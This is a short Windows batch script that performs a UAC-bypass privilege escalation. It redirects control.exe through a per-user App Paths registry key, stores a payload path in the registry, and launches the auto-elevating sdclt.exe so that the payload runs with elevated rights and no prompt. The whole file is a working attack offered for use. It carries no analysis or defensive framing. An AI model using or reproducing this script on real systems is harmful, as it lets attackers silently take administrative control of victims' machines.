@echo off
REM Script written by: Rob Emmerson (robemmerson)
cls

REM Go to dump directory and set the payload to execute when control.exe is launched
cd /d %~dp0
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /ve /d "%cd%\run_cmd.exe" /f >nul 2>&1
reg add "HKCU\Software\Microsoft" /v "exe" /d "%cd%\payload.exe" /f >nul 2>&1

REM Start a process that bypasses UAC which we can hijack by changing the app path for control.exe above
start "" "sdclt.exe"